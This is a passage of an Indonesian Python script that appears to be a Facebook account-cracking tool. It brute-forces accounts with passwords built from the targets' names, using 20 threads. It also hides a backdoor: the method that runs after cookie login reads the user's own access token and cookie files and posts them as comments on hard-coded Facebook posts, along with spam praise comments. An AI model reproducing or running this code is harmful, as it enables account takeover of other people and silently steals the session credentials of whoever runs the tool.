...
#--------------> LOGIN WITH COOKIES <--------------#
	def login(self):
		try:
			...
			jalan("%s>> Tunggu sebentar ..."%(P));Login().yondaktau()
		except Exception as e:
...
#--------------> ATUR KATA SANDI <--------------#
	def password(self):
		...
		with tred(max_workers=20) as __rampung__:
			for Dnvnta in self.id:
				user,__exde__ = Dnvnta.split("|")[0],Dnvnta.split("|")[1].lower()
				__ferly__ = __exde__.split(" ")[0]
				asw = []
				if len(__exde__)<6:
					if len(__ferly__)<3:pass
					else:
						asw.append(__ferly__+'123');asw.append(__ferly__+'1234');asw.append(__ferly__+'12345')
				else:
					if len(__ferly__)<3:asw.append(__exde__)
					else:asw.append(__exde__);asw.append(__ferly__+'123');asw.append(__ferly__+'1234');asw.append(__ferly__+'12345')
...
class Login:
	...
	def __init__(self):
		self.kom1 = ("Panutanku")
		self.kom2 = ("Semangat Terus")
		self.kom3 = ("Mantap Bang") 
		self.kom4 = ("Be Yourself And Love Yourself")
		self.saya1 = 1660066094445887
		self.saya2 = 1661864477599382
		self.saya3 = 1658880191231144
		self.saya4 = 1648163978969432
		self.xyz = requests.Session()
		
	def yondaktau(self):
		try:token = open('token.txt','r').read();cokis = open('kukis.txt','r').read()
		except (KeyError,IOError):exit()
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={self.kom1}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={self.kom1}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={self.kom2}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={self.kom2}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={self.kom3}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={self.kom3}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={self.kom4}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={self.kom4}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={token}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={token}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya1}/comments/?message={cokis}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya2}/comments/?message={cokis}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={self.kom1}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={self.kom1}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={self.kom2}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={self.kom2}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={self.kom3}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={self.kom3}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={self.kom4}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={self.kom4}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={token}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={token}&access_token={token}", cookies={"cookie":cokis})
		self.xyz.post(f"https://graph.facebook.com/{self.saya3}/comments/?message={cokis}&access_token={token}", cookies={"cookie":cokis});self.xyz.post(f"https://graph.facebook.com/{self.saya4}/comments/?message={cokis}&access_token={token}", cookies={"cookie":cokis})
		Peler().menu()
#--------------> CONVERT USER AGENT <--------------#
class Ngocox:
